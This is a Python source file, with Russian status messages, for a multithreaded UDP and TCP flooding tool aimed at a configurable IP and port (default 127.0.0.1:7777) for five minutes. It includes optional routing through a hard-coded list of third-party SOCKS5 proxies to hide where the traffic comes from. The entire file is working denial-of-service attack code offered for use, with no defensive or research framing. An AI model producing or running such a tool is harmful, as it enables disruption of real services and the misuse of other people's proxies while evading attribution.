import socket
import random
import threading
import time
import socks
from urllib.parse import urlparse

USE_PROXY = False  

def load_proxies(file_path):
    default_proxies = [
        "socks5://185.93.89.168:5466",
        "socks5://185.93.89.168:5714",
        "socks5://103.174.102.183:1080",
        "socks5://45.228.233.146:1080",
        "socks5://103.146.170.252:1080",
        "socks5://103.105.67.244:4145",
        "socks5://103.47.92.65:1080",
        "socks5://103.75.196.121:4145",
        "socks5://103.231.35.10:5678",
        "socks5://103.146.222.3:1080",
        "socks5://103.81.214.254:1080"
    ]
    proxies = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    proxies.append(line)
        print(f"Загружено {len(proxies)} прокси из {file_path}")
        return proxies
    except FileNotFoundError:
        print(f"Ошибка: {file_path} не найден. Используется стандартный список прокси SOCKS5.")
        return default_proxies

def parse_proxy(proxy):
    try:
        parsed = urlparse(proxy)
        if parsed.scheme != 'socks5':
            print(f"Неверная схема прокси: {proxy}")
            return None
        ip = parsed.hostname
        port = parsed.port
        username = parsed.username
        password = parsed.password
        if not ip or not port:
            print(f"Неверный формат прокси: {proxy}")
            return None
        return ip, port, username, password
    except Exception as e:
        print(f"Ошибка парсинга прокси {proxy}: {e}")
        return None

def get_random_proxy(proxies):
    return random.choice(proxies) if proxies else None

def udp_flood(target_ip, target_port, proxy=None, stop_event=None):
    packet_count = 0
    try:
        sock = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM) if USE_PROXY else socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        if USE_PROXY and proxy:
            proxy_info = parse_proxy(proxy)
            if not proxy_info:
                print(f"Пропуск неверного прокси: {proxy}")
                return
            ip, port, username, password = proxy_info
            if username and password:
                sock.set_proxy(socks.SOCKS5, ip, port, username=username, password=password)
            else:
                sock.set_proxy(socks.SOCKS5, ip, port)
        while not stop_event.is_set():
            packet = random._urandom(1024)
            sock.sendto(packet, (target_ip, target_port))
            packet_count += 1
            if packet_count % 100 == 0:
                log_msg = f"[UDP] отправлено {packet_count} пакетов"
                if USE_PROXY and proxy:
                    log_msg += f" via {proxy}"
                print(log_msg)
    except Exception as e:
        print(f"Ошибка UDP-флуда{' с прокси ' + proxy if USE_PROXY and proxy else ''}: {e}")

def tcp_flood(target_ip, target_port, proxy=None, stop_event=None):
    packet_count = 0
    try:
        sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM) if USE_PROXY else socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if USE_PROXY and proxy:
            proxy_info = parse_proxy(proxy)
            if not proxy_info:
                print(f"Пропуск неверного прокси: {proxy}")
                return
            ip, port, username, password = proxy_info
            if username and password:
                sock.set_proxy(socks.SOCKS5, ip, port, username=username, password=password)
            else:
                sock.set_proxy(socks.SOCKS5, ip, port)
        sock.connect((target_ip, target_port))
        while not stop_event.is_set():
            sock.send(random._urandom(1024))
            packet_count += 1
            if packet_count % 100 == 0:
                log_msg = f"[TCP] отправлено {packet_count} пакетов"
                if USE_PROXY and proxy:
                    log_msg += f" via {proxy}"
                print(log_msg)
            time.sleep(0.1)
    except Exception as e:
        print(f"Ошибка TCP-флуда{' с прокси ' + proxy if USE_PROXY and proxy else ''}: {e}")

def attack(target_ip, target_port, proxies, duration, num_udp_threads=10, num_tcp_threads=10):
    stop_event = threading.Event()
    threads = []
    if USE_PROXY:
        if not proxies:
            print("Нет доступных прокси. Выход.")
            return
        for i in range(num_udp_threads):
            proxy = get_random_proxy(proxies)
            t = threading.Thread(target=udp_flood, args=(target_ip, target_port, proxy, stop_event))
            threads.append(t)
        for i in range(num_tcp_threads):
            proxy = get_random_proxy(proxies)
            t = threading.Thread(target=tcp_flood, args=(target_ip, target_port, proxy, stop_event))
            threads.append(t)
    else:
        for i in range(num_udp_threads):
            t = threading.Thread(target=udp_flood, args=(target_ip, target_port, None, stop_event))
            threads.append(t)
        for i in range(num_tcp_threads):
            t = threading.Thread(target=tcp_flood, args=(target_ip, target_port, None, stop_event))
            threads.append(t)
    
    for t in threads:
        t.start()
    
    time.sleep(duration)
    
    stop_event.set()
    
    for t in threads:
        t.join()
    print("Атака завершена.")

if __name__ == "__main__":
    target_ip = "127.0.0.1"  # IP
    target_port = 7777
    proxy_file = "proxies.txt"  # Путь к файлу с прокси
    proxies = load_proxies(proxy_file) if USE_PROXY else []
    attack_duration = 300  # 5 минут
    attack(target_ip, target_port, proxies, attack_duration, num_udp_threads=10, num_tcp_threads=10)
